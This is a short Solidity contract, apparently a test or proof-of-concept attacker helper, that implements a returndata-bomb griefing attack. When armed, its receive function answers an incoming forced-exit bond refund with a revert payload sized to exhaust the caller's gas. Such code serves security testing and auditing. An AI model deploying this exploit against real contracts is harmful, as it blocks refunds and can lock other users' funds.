// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

/// @notice Attacker-controlled account (taker or maker). While `armed`, any ETH sent to it (the
///         forced-exit bond refund) is answered with a huge revert payload. The caller only keeps
///         1/64 of its gas during the call, but Solidity copies the whole returndata into memory
///         afterwards, so the caller runs out of gas whatever gas limit it was given.
contract BombAccount {
    address public immutable owner;
    bool public armed;

    constructor() {
        owner = msg.sender;
    }

    function setArmed(bool a) external {
        require(msg.sender == owner, "owner");
        armed = a;
    }

    receive() external payable {
        if (!armed) return;
        // memory cost of w words ~ w^2 / 512: spend ~3/4 of our gas building the payload.
        uint256 w = _sqrt(384 * gasleft());
        assembly {
            revert(0, mul(w, 32))
        }
    }

    function _sqrt(uint256 x) internal pure returns (uint256 z) {
        if (x == 0) return 0;
        z = x;
        uint256 y = x / 2 + 1;
        while (y < z) {
            z = y;
            y = (x / y + y) / 2;
        }
    }
}
